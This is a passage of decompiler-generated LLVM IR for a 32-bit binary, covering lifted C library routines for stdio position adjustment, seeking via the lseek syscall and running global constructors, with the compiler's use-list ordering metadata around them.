203, 204, 205, 206, 23, 207, 208, 209, 210, 211, 212, 213, 214, 24, 25, 215, 26, 216, 217, 218, 27, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 4, 229, 230, 231, 232, 233, 234, 235, 236, 135, 136, 137, 138, 139, 237, 238, 239, 240, 301, 302, 128, 129, 130, 303, 304, 305, 306, 307, 308, 309, 313, 314, 315, 316, 310, 311, 312, 120, 121, 122, 123, 241, 242, 243, 5, 244, 245, 246, 124, 125, 126, 127, 254, 258, 28, 259, 260, 261, 262, 263, 264, 265, 255, 256, 257, 266, 267, 268, 269, 270, 271, 272, 6, 273, 274, 275, 276, 29, 277, 36, 278, 279, 280, 281, 247, 248, 249, 250, 251, 252, 253, 133, 134, 282, 283, 131, 132, 140, 141, 142, 317 }
  uselistorder i32* @edi, { 24, 2, 25, 26, 27, 124, 125, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 3, 39, 40, 41, 42, 43, 44, 45, 4, 126, 127, 20, 128, 129, 130, 19, 131, 46, 47, 5, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 6, 73, 21, 22, 23, 59, 7, 60, 61, 253, 254, 8, 255, 256, 9, 259, 260, 74, 75, 76, 77, 261, 262, 263, 132, 10, 133, 0, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 78, 12, 11, 79, 80, 81, 82, 83, 91, 84, 85, 86, 87, 88, 89, 90, 149, 13, 150, 14, 151, 152, 153, 154, 159, 160, 1, 155, 156, 157, 158, 161, 162, 163, 164, 15, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 264, 265, 266, 267, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 117, 118, 119, 120, 99, 100, 101, 268, 269, 270, 271, 272, 280, 92, 93, 94, 95, 96, 97, 98, 204, 16, 205, 206, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 17, 241, 242, 243, 244, 245, 207, 208, 18, 209, 210, 211, 212, 213, 214, 215, 278, 279, 257, 258, 102, 103, 104, 281, 282, 105, 106, 216, 217, 107, 108, 109, 273, 274, 275, 276, 277, 110, 111, 112, 113, 114, 115, 116, 121, 122, 123, 246, 247, 248, 249, 250, 251, 252 }
  uselistorder i32* @ebp, { 9, 10, 11, 12, 13, 14, 15, 5, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0, 32, 6, 7, 8, 33, 34, 35, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 36, 37, 38, 1, 39, 40, 41, 4, 67, 68, 69, 74, 70, 71, 72, 73, 75, 76, 2, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 99, 98, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 42, 43, 44, 122, 123, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 153, 149, 150, 151, 152, 3, 154, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 45, 46, 47, 48, 49, 50, 51, 135, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fb6d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fb58, { 1, 0 }
  uselistorder label %dec_label_pc_804fb1f, { 1, 0 }
  uselistorder label %dec_label_pc_804faf1, { 1, 0 }
}

define i32 @__stdio_adjust_position(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_804fb88 = load i32, i32* %arg1, align 4
  store i32 %v2_804fb88, i32* %esi.global-to-local, align 4
  %v1_804fb8f = urem i32 %v2_804fb88, 4
  %v2_804fb8f = icmp eq i32 %v1_804fb8f, 0
  store i32 %v1_804fb8f, i32* %ecx.global-to-local, align 4
  br i1 %v2_804fb8f, label %dec_label_pc_804fbbe, label %dec_label_pc_804fb94

dec_label_pc_804fb94:                             ; preds = %entry
  %v1_804fb96 = add nsw i32 %v1_804fb8f, -1
  %v8_804fb96 = icmp eq i32 %v1_804fb96, 0
  store i32 %v1_804fb96, i32* @edx, align 4
  br i1 %v8_804fb96, label %dec_label_pc_804fbbe, label %dec_label_pc_804fb99

dec_label_pc_804fb99:                             ; preds = %dec_label_pc_804fb94
  %v3_804fb99 = and i32 %v2_804fb88, 2048
  %v4_804fb99 = icmp eq i32 %v3_804fb99, 0
  br i1 %v4_804fb99, label %dec_label_pc_804fbbe, label %dec_label_pc_804fb9e

dec_label_pc_804fb9e:                             ; preds = %dec_label_pc_804fb99
  %v6_804fb9e = sub nsw i32 1, %v1_804fb8f
  %v7_804fb9e = and i32 %v1_804fb96, %v6_804fb9e
  %v8_804fb9e = icmp slt i32 %v7_804fb9e, 0
  %v9_804fb9e = icmp eq i32 %v1_804fb8f, 2
  %v10_804fb9e = icmp ult i32 %v1_804fb8f, 2
  %v3_804fba1 = icmp eq i1 %v10_804fb9e, %v8_804fb9e
  %v4_804fba1 = icmp eq i1 %v9_804fb9e, false
  %v5_804fba1 = and i1 %v4_804fba1, %v3_804fba1
  br i1 %v5_804fba1, label %dec_label_pc_804fc14, label %dec_label_pc_804fba3

dec_label_pc_804fba3:                             ; preds = %dec_label_pc_804fb9e
  %v1_804fba3 = add i32 %tmp6, 40
  %v2_804fba3 = inttoptr i32 %v1_804fba3 to i32*
  %v3_804fba3 = load i32, i32* %v2_804fba3, align 4
  %v4_804fba3 = icmp eq i32 %v3_804fba3, 0
  %v1_804fba7 = icmp eq i1 %v4_804fba3, false
  br i1 %v1_804fba7, label %dec_label_pc_804fc14, label %dec_label_pc_804fba9

dec_label_pc_804fba9:                             ; preds = %dec_label_pc_804fba3
  %v1_804fba9 = add i32 %tmp6, 3
  %v2_804fba9 = inttoptr i32 %v1_804fba9 to i8*
  %v3_804fba9 = load i8, i8* %v2_804fba9, align 1
  %v4_804fba9 = zext i8 %v3_804fba9 to i32
  %v2_804fbad = sub nsw i32 %v1_804fb96, %v4_804fba9
  %v1_804fbaf = add i32 %tmp6, 44
  %v2_804fbaf = inttoptr i32 %v1_804fbaf to i32*
  %v3_804fbaf = load i32, i32* %v2_804fbaf, align 4
  %v1_804fbb3 = add nsw i32 %v2_804fbad, -1
  %tmp12 = icmp slt i32 %v3_804fbaf, 1
  br i1 %tmp12, label %dec_label_pc_804fbbe, label %dec_label_pc_804fbb8

dec_label_pc_804fbb8:                             ; preds = %dec_label_pc_804fba9
  %v1_804fbb8 = add i32 %tmp6, 2
  %v2_804fbb8 = inttoptr i32 %v1_804fbb8 to i8*
  %v3_804fbb8 = load i8, i8* %v2_804fbb8, align 1
  %v4_804fbb8 = zext i8 %v3_804fbb8 to i32
  %v2_804fbbc = sub nsw i32 %v1_804fbb3, %v4_804fbb8
  br label %dec_label_pc_804fbbe

dec_label_pc_804fbbe:                             ; preds = %dec_label_pc_804fba9, %dec_label_pc_804fb99, %dec_label_pc_804fb94, %entry, %dec_label_pc_804fbb8
  %v0_804fbd5 = phi i32 [ %v1_804fbb3, %dec_label_pc_804fba9 ], [ %v1_804fb96, %dec_label_pc_804fb99 ], [ 0, %dec_label_pc_804fb94 ], [ 0, %entry ], [ %v2_804fbbc, %dec_label_pc_804fbb8 ]
  %v2_804fbbe = and i32 %v2_804fb88, 64
  %v3_804fbbe = icmp eq i32 %v2_804fbbe, 0
  %storemerge.in.in.v = select i1 %v3_804fbbe, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_804fbcd = add i32 %tmp6, 16
  %v3_804fbcd = inttoptr i32 %v2_804fbcd to i32*
  %v4_804fbcd = load i32, i32* %v3_804fbcd, align 4
  %v5_804fbcd = sub i32 %storemerge, %v4_804fbcd
  %v1_804fbd0 = inttoptr i32 %arg2 to i32*
  %v2_804fbd0 = load i32, i32* %v1_804fbd0, align 4
  store i32 %v2_804fbd0, i32* %ecx.global-to-local, align 4
  %v1_804fbd2 = add i32 %arg2, 4
  %v2_804fbd2 = inttoptr i32 %v1_804fbd2 to i32*
  %v3_804fbd2 = load i32, i32* %v2_804fbd2, align 4
  store i32 %v3_804fbd2, i32* %ebx.global-to-local, align 4
  %v2_804fbd5 = add i32 %v5_804fbcd, %v0_804fbd5
  store i32 %v2_804fbd5, i32* %esi.global-to-local, align 4
  %v2_804fbe0 = ashr i32 %v2_804fbd5, 31
  %v5_804fbe9 = sub i32 %v2_804fbd0, %v2_804fbd5
  %v10_804fbe9 = icmp ult i32 %v2_804fbd0, %v2_804fbd5
  %v6_804fbed = zext i1 %v10_804fbe9 to i32
  %tmp = icmp slt i32 %v2_804fbd5, 0
  %v2_804fbe0.neg = zext i1 %tmp to i32
  %v7_804fbed = add i32 %v3_804fbd2, %v2_804fbe0.neg
  %v8_804fbed = add i32 %v7_804fbed, %v6_804fbed
  store i32 %v8_804fbed, i32* @edx, align 4
  store i32 %v5_804fbe9, i32* %v1_804fbd0, align 4
  %v0_804fbf3 = load i32, i32* @edx, align 4
  %v1_804fbf3 = load i32, i32* %edi.global-to-local, align 4
  %v2_804fbf3 = add i32 %v1_804fbf3, 4
  %v3_804fbf3 = inttoptr i32 %v2_804fbf3 to i32*
  store i32 %v0_804fbf3, i32* %v3_804fbf3, align 4
  %v0_804fbf6 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fbf6 = add i32 %v0_804fbf6, 4
  %v2_804fbf6 = inttoptr i32 %v1_804fbf6 to i32*
  %v3_804fbf6 = load i32, i32* %v2_804fbf6, align 4
  %v4_804fbf6 = load i32, i32* %ebx.global-to-local, align 4
  %v5_804fbf9 = icmp slt i32 %v3_804fbf6, %v4_804fbf6
  br i1 %v5_804fbf9, label %dec_label_pc_804fc03, label %dec_label_pc_804fbfb

dec_label_pc_804fbfb:                             ; preds = %dec_label_pc_804fbbe
  %v8_804fbfb = icmp sgt i32 %v3_804fbf6, %v4_804fbf6
  br i1 %v8_804fbfb, label %dec_label_pc_804fc01, label %dec_label_pc_804fbfd

dec_label_pc_804fbfd:                             ; preds = %dec_label_pc_804fbfb
  %v1_804fbfd = inttoptr i32 %v0_804fbf6 to i32*
  %v2_804fbfd = load i32, i32* %v1_804fbfd, align 4
  %v3_804fbfd = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_804fbfd, %v3_804fbfd
  br i1 %tmp14, label %dec_label_pc_804fc01, label %dec_label_pc_804fc03

dec_label_pc_804fc01:                             ; preds = %dec_label_pc_804fbfd, %dec_label_pc_804fbfb
  %v0_804fc01 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fc01 = sub i32 0, %v0_804fc01
  store i32 %v1_804fc01, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fc03

dec_label_pc_804fc03:                             ; preds = %dec_label_pc_804fbfd, %dec_label_pc_804fbbe, %dec_label_pc_804fc01
  %v0_804fc03 = load i32, i32* %esi.global-to-local, align 4
  %v2_804fc03 = icmp slt i32 %v0_804fc03, 0
  %v1_804fc05 = icmp eq i1 %v2_804fc03, false
  br i1 %v1_804fc05, label %dec_label_pc_804fc17, label %dec_label_pc_804fc07

dec_label_pc_804fc07:                             ; preds = %dec_label_pc_804fc03
  %v1_804fc07 = call i32 @__errno_location(i32 %v2_804fbe0)
  %v1_804fc0c = inttoptr i32 %v1_804fc07 to i32*
  store i32 75, i32* %v1_804fc0c, align 4
  %v0_804fc1a.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fc17

dec_label_pc_804fc14:                             ; preds = %dec_label_pc_804fba3, %dec_label_pc_804fb9e
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fc17

dec_label_pc_804fc17:                             ; preds = %dec_label_pc_804fc03, %dec_label_pc_804fc07, %dec_label_pc_804fc14
  %v0_804fc1a = phi i32 [ %v0_804fc03, %dec_label_pc_804fc03 ], [ %v0_804fc1a.pre, %dec_label_pc_804fc07 ], [ -1, %dec_label_pc_804fc14 ]
  ret i32 %v0_804fc1a

; uselistorder directives
  uselistorder i32 %v4_804fbf6, { 1, 0 }
  uselistorder i32 %v3_804fbf6, { 1, 0 }
  uselistorder i32 %v1_804fb96, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_804fb8f, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_804fb88, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 2, 1, 3, 5, 6 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 16, { 20, 21, 22, 23, 24, 25, 53, 26, 27, 28, 29, 9, 54, 55, 56, 57, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 39, 40, 4, 41, 42, 18, 43, 100, 59, 58, 5, 60, 61, 10, 2, 62, 11, 101, 63, 64, 102, 103, 104, 65, 3, 66, 67, 68, 69, 70, 71, 78, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 12, 19, 13, 51, 17, 44, 89, 45, 105, 93, 7, 6, 94, 1, 8, 90, 91, 14, 46, 47, 48, 49, 50, 52, 15, 92, 16, 95, 96, 97, 98, 99 }
  uselistorder i32 8, { 33, 47, 48, 49, 50, 51, 52, 53, 34, 54, 55, 81, 82, 83, 56, 84, 11, 12, 46, 57, 58, 59, 60, 62, 63, 64, 61, 65, 66, 67, 68, 18, 19, 69, 70, 71, 72, 73, 74, 13, 153, 154, 86, 85, 87, 14, 15, 88, 89, 90, 91, 92, 93, 1, 94, 16, 10, 155, 95, 96, 156, 157, 158, 97, 98, 99, 100, 101, 35, 20, 21, 22, 23, 36, 24, 25, 26, 37, 27, 38, 28, 39, 40, 159, 30, 160, 31, 161, 32, 45, 29, 75, 103, 102, 76, 77, 107, 108, 109, 110, 111, 112, 113, 2, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 3, 124, 125, 126, 127, 128, 42, 4, 43, 5, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 41, 146, 147, 6, 148, 149, 150, 151, 7, 152, 104, 105, 17, 0, 78, 79, 44, 80, 106, 9, 8 }
  uselistorder i32 20, { 3, 8, 4, 9, 10, 20, 21, 22, 11, 12, 13, 0, 14, 1, 15, 5, 16, 17, 23, 24, 25, 30, 26, 27, 6, 28, 2, 7, 18, 29, 19 }
  uselistorder i32 64, { 2, 0, 1, 6, 3, 5, 7, 4 }
  uselistorder i32 44, { 2, 3, 5, 6, 7, 4, 8, 18, 9, 10, 1, 15, 17, 16, 12, 13, 14, 11, 0 }
  uselistorder i32 3, { 30, 6, 20, 3, 21, 28, 14, 13, 8, 9, 7, 31, 32, 33, 34, 35, 36, 22, 4, 23, 15, 37, 24, 11, 10, 5, 1, 2, 0, 12, 29, 26, 38, 16, 17, 27, 18, 19, 25 }
  uselistorder i32 40, { 1, 7, 2, 3, 4, 5, 8, 9, 10, 11, 12, 0, 6 }
  uselistorder i32 2, { 66, 34, 26, 67, 38, 68, 69, 47, 0, 40, 41, 82, 22, 83, 84, 1, 42, 70, 71, 39, 2, 3, 72, 23, 4, 73, 5, 43, 74, 75, 85, 21, 51, 87, 88, 24, 28, 27, 86, 89, 90, 91, 64, 92, 93, 94, 95, 96, 97, 76, 29, 77, 78, 35, 98, 99, 30, 52, 36, 31, 32, 100, 48, 101, 102, 103, 104, 65, 110, 111, 6, 116, 44, 117, 53, 63, 37, 7, 81, 25, 54, 8, 9, 10, 11, 109, 12, 13, 49, 14, 105, 106, 107, 108, 33, 45, 79, 50, 80, 15, 55, 16, 56, 62, 17, 57, 58, 59, 60, 18, 19, 114, 46, 112, 20, 113, 115, 61 }
  uselistorder i32 2048, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fc17, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fc03, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fbbe, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_804fc2c = add i32 %tmp5, 4
  %v2_804fc2c = inttoptr i32 %v1_804fc2c to i32*
  %v3_804fc2c = load i32, i32* %v2_804fc2c, align 4
  %v2_804fc2f = load i32, i32* %arg2, align 4
  %v1_804fc35 = add i32 %arg1, 4
  %v2_804fc35 = inttoptr i32 %v1_804fc35 to i32*
  %v3_804fc35 = load i32, i32* %v2_804fc35, align 4
  %v4_804fc38 = call i32 @__libc_lseek64(i32 %v3_804fc35, i32 %v2_804fc2f, i32 %v3_804fc2c, i32 %arg3)
  %v0_804fc42 = load i32, i32* @edx, align 4
  %v2_804fc42 = icmp slt i32 %v0_804fc42, 0
  br i1 %v2_804fc42, label %dec_label_pc_804fc4d, label %dec_label_pc_804fc46

dec_label_pc_804fc46:                             ; preds = %entry
  %v1_804fc46 = load i32, i32* @ebx, align 4
  %v2_804fc46 = inttoptr i32 %v1_804fc46 to i32*
  store i32 %v4_804fc38, i32* %v2_804fc46, align 4
  %v0_804fc48 = load i32, i32* @edx, align 4
  %v1_804fc48 = load i32, i32* @ebx, align 4
  %v2_804fc48 = add i32 %v1_804fc48, 4
  %v3_804fc48 = inttoptr i32 %v2_804fc48 to i32*
  store i32 %v0_804fc48, i32* %v3_804fc48, align 4
  br label %dec_label_pc_804fc4d

dec_label_pc_804fc4d:                             ; preds = %entry, %dec_label_pc_804fc46
  %v0_804fc4d = phi i32 [ %v4_804fc38, %entry ], [ 0, %dec_label_pc_804fc46 ]
  ret i32 %v0_804fc4d

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder i32 4, { 74, 75, 76, 77, 78, 79, 1, 2, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 55, 90, 140, 91, 141, 142, 143, 92, 3, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 35, 36, 72, 29, 110, 111, 112, 248, 150, 151, 152, 146, 144, 145, 147, 148, 149, 30, 4, 153, 154, 155, 156, 157, 158, 159, 160, 161, 37, 113, 114, 115, 38, 39, 40, 162, 51, 31, 249, 137, 5, 6, 163, 7, 164, 56, 165, 166, 167, 168, 169, 170, 171, 172, 173, 60, 174, 175, 176, 177, 64, 41, 178, 179, 180, 181, 42, 43, 44, 65, 45, 46, 47, 48, 182, 49, 183, 66, 50, 67, 68, 8, 250, 251, 253, 254, 258, 259, 260, 252, 52, 71, 9, 116, 117, 118, 119, 120, 69, 188, 189, 190, 61, 184, 185, 186, 187, 121, 122, 123, 124, 125, 62, 10, 126, 127, 255, 257, 199, 200, 201, 202, 203, 204, 11, 205, 206, 207, 208, 209, 210, 211, 212, 197, 198, 213, 54, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 26, 234, 235, 237, 236, 12, 128, 256, 129, 130, 191, 192, 53, 193, 194, 195, 196, 32, 13, 33, 131, 132, 133, 134, 14, 135, 15, 16, 27, 17, 0, 18, 19, 20, 136, 21, 138, 63, 139, 22, 28, 23, 238, 24, 57, 58, 70, 239, 59, 240, 241, 242, 243, 244, 245, 246, 25, 34, 247, 73 }
  uselistorder label %dec_label_pc_804fc4d, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804fc56 = load i32, i32* @ebx, align 4
  store i32 %v0_804fc56, i32* %stack_var_-12, align 4
  %v2_804fc6a = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804fc6a, i32* %esi.global-to-local, align 4
  %v1_804fc81 = call i32 @int80_syscall(i32 140)
  store i32 %v1_804fc81, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_804fc81, -4095
  br i1 %tmp18, label %dec_label_pc_804fc9b, label %dec_label_pc_804fc8d

dec_label_pc_804fc8d:                             ; preds = %entry
  %v2_804fc6e = ashr i32 %arg3, 31
  %v1_804fc8d = call i32 @__errno_location(i32 %v2_804fc6e)
  %v0_804fc92 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fc92 = sub i32 0, %v0_804fc92
  %v2_804fc94 = inttoptr i32 %v1_804fc8d to i32*
  store i32 %v1_804fc92, i32* %v2_804fc94, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_804fcaf.pre.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804fc9f

dec_label_pc_804fc9b:                             ; preds = %entry
  %v1_804fc9b = icmp eq i32 %v1_804fc81, 0
  br i1 %v1_804fc9b, label %dec_label_pc_804fca4, label %dec_label_pc_804fc9f

dec_label_pc_804fc9f:                             ; preds = %dec_label_pc_804fc9b, %dec_label_pc_804fc8d
  %v2_804fcaf.pre = phi i32 [ %v0_804fc56, %dec_label_pc_804fc9b ], [ %v2_804fcaf.pre.pre, %dec_label_pc_804fc8d ]
  %v0_804fc9f = phi i32 [ %v1_804fc81, %dec_label_pc_804fc9b ], [ -1, %dec_label_pc_804fc8d ]
  %v1_804fca1 = ashr i32 %v0_804fc9f, 31
  br label %dec_label_pc_804fcac

dec_label_pc_804fca4:                             ; preds = %dec_label_pc_804fc9b
  %v3_804fca4 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_804fcac

dec_label_pc_804fcac:                             ; preds = %dec_label_pc_804fc9f, %dec_label_pc_804fca4
  %v2_804fcaf = phi i32 [ %v2_804fcaf.pre, %dec_label_pc_804fc9f ], [ %v0_804fc56, %dec_label_pc_804fca4 ]
  %v0_804fcb2 = phi i32 [ %v0_804fc9f, %dec_label_pc_804fc9f ], [ %v3_804fca4, %dec_label_pc_804fca4 ]
  %storemerge = phi i32 [ %v1_804fca1, %dec_label_pc_804fc9f ], [ %tmp, %dec_label_pc_804fca4 ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v2_804fcaf, i32* @ebx, align 4
  ret i32 %v0_804fcb2

; uselistorder directives
  uselistorder i32 %v1_804fc81, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804fc56, { 1, 0, 2 }
  uselistorder i32* @edx, { 19, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 7, 99, 100, 101, 102, 103, 104, 38, 105, 106, 8, 107, 108, 109, 39, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 18, 58, 59, 41, 60, 9, 61, 62, 64, 10, 65, 66, 67, 68, 69, 22, 11, 63, 231, 232, 233, 234, 12, 235, 236, 110, 111, 2, 114, 112, 113, 1, 115, 116, 117, 118, 119, 120, 121, 122, 70, 74, 71, 72, 73, 123, 124, 125, 126, 127, 128, 129, 135, 130, 131, 132, 133, 134, 3, 20, 87, 136, 137, 138, 139, 238, 140, 141, 142, 143, 144, 146, 145, 4, 147, 148, 149, 150, 224, 13, 5, 21, 88, 151, 240, 155, 241, 156, 0, 75, 76, 77, 223, 242, 243, 248, 247, 89, 14, 90, 91, 92, 93, 94, 95, 96, 78, 159, 160, 15, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 16, 174, 175, 157, 158, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 17, 213, 214, 215, 216, 217, 218, 219, 244, 79, 152, 153, 154, 86, 80, 81, 237, 249, 239, 220, 82, 245, 246, 83, 84, 85, 97, 98, 221, 222, 225, 6, 226, 227, 228, 229, 230, 250 }
  uselistorder i32 (i32)* @__errno_location, { 61, 60, 59, 29, 58, 28, 57, 56, 55, 54, 20, 40, 26, 25, 53, 39, 19, 38, 37, 36, 32, 31, 35, 47, 18, 17, 16, 15, 30, 14, 52, 13, 12, 11, 51, 10, 23, 8, 9, 42, 41, 50, 49, 48, 27, 1, 46, 34, 21, 45, 4, 22, 44, 7, 3, 2, 0, 33, 43, 6, 5, 24 }
  uselistorder i32 31, { 9, 10, 11, 12, 13, 14, 15, 16, 17, 22, 23, 7, 6, 24, 18, 19, 20, 2, 3, 0, 1, 8, 4, 5, 21 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_804fcac, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_804fccc = load i32, i32* @global_var_8052000.69, align 8192
  %v10_804fcd1 = icmp eq i32 %v0_804fccc, -1
  br i1 %v10_804fcd1, label %dec_label_pc_804fce2, label %dec_label_pc_804fcd6.preheader

dec_label_pc_804fcd6.preheader:                   ; preds = %entry
  br label %dec_label_pc_804fcd6

dec_label_pc_804fcd6:                             ; preds = %dec_label_pc_804fcd6.preheader, %dec_label_pc_804fcd6
  %v4_804fcd9 = phi i32 [ %v0_804fccc, %dec_label_pc_804fcd6.preheader ], [ %v2_804fcdb, %dec_label_pc_804fcd6 ]
  %v0_804fcd6 = phi i32 [ ptrtoint (i32* @global_var_8052000.69 to i32), %dec_label_pc_804fcd6.preheader ], [ %v1_804fcd6, %dec_label_pc_804fcd6 ]
  %v1_804fcd6 = add i32 %v0_804fcd6, -4
  call void @__pseudo_call(i32 %v4_804fcd9)
  %v1_804fcdb = inttoptr i32 %v1_804fcd6 to i32*
  %v2_804fcdb = load i32, i32* %v1_804fcdb, align 4
  %v10_804fcdd = icmp eq i32 %v2_804fcdb, -1
  %v1_804fce0 = icmp eq i1 %v10_804fcdd, false
  br i1 %v1_804fce0, label %dec_label_pc_804fcd6, label %dec_label_pc_804fce2.loopexit

dec_label_pc_804fce2.loopexit:                    ; preds = %dec_label_pc_804fcd6
  %v2_804fce2.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804fce2

dec_label_pc_804fce2:                             ; preds = %dec_label_pc_804fce2.loopexit, %entry
  %v2_804fce2 = phi i32 [ %v2_804fce2.pre, %dec_label_pc_804fce2.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_804fce2

; uselistorder directives
  uselistorder i32 %v0_804fccc, { 1, 0 }
  uselistorder i1 false, { 397, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 64, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 235, 236, 237, 111, 112, 238, 36, 239, 240, 113, 51, 114, 115, 116, 241, 2, 0, 1, 4, 242, 244, 243, 3, 246, 245, 247, 117, 118, 119, 52, 120, 5, 121, 122, 248, 249, 250, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 142, 141, 6, 143, 144, 145, 146, 147, 149, 34, 150, 148, 151, 153, 152, 7, 154, 155, 157, 156, 53, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 67, 68, 398, 399, 50, 182, 37, 9, 38, 258, 253, 257, 255, 256, 54, 251, 252, 254, 8, 259, 260, 261, 262, 183, 185, 186, 187, 188, 184, 189, 190, 191, 194, 192, 193, 263, 264, 270, 39, 265, 266, 268, 267, 271, 272, 277, 276, 273, 274, 275, 10, 400, 11, 209, 210, 211, 55, 278, 279, 280, 283, 281, 282, 12, 40, 284, 286, 285, 56, 287, 289, 288, 57, 290, 291, 401, 58, 402, 13, 292, 293, 294, 295, 296, 297, 298, 330, 41, 15, 299, 300, 301, 302, 304, 303, 14, 305, 306, 42, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 371, 372, 374, 373, 16, 212, 213, 214, 215, 319, 320, 331, 332, 333, 403, 413, 414, 415, 416, 417, 419, 59, 420, 421, 418, 412, 404, 66, 216, 217, 218, 219, 220, 221, 17, 322, 18, 323, 324, 321, 195, 405, 406, 407, 408, 409, 410, 411, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 334, 347, 348, 349, 350, 351, 352, 353, 354, 35, 356, 355, 360, 357, 358, 359, 19, 361, 362, 196, 197, 325, 326, 327, 328, 207, 269, 205, 200, 198, 199, 60, 201, 20, 202, 203, 204, 206, 208, 222, 223, 224, 225, 226, 227, 230, 65, 228, 229, 21, 22, 231, 232, 233, 